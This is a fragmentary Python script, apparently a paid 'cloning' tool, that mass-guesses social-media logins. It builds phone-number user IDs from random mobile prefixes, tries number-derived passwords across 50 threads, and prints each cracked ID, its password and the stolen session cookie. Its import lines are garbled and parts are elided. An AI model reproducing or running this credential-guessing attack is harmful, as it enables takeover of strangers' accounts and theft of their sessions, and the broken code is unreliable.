#md sumon islam
#github: sumon987
 os,sys,time,json,random,re,string,platform,base64,uuid
os.sbs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetimert sleep
...
\33[1;92m║[•] Whatsapp  : +01725891440            ║
\33[1;92m║[•] Github    : SUMON987                ║
\33[1;92m║[•] Status    : PAID                    ║
\33[1;92m║[•] Network   : 3G, 4G/5G, ON           ║
\33[1;92m║[•] Version   : 1.4.8                   ║
\33[1;92m║[•] Tools     : KB KK GAMING            ║
\33[1;91m╚════════════════════════════════════════╝"""
loop = 0
oks = []
cps = []
...
def xxr():
    ...
    rk13 = '0178'
    rk14 = '0193'
    code = random.choice([rk1,rk2,rk3,rk4,rk5,rk10])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    print(logo)
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[33;0;94mXXXXXXXXXXXXXX')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;92mXXXXXXXXXXXXXXXXXXXXXXXX')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[KK-OK💚] ' +uid+ ' | ' +ps+    '  \n[kk😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
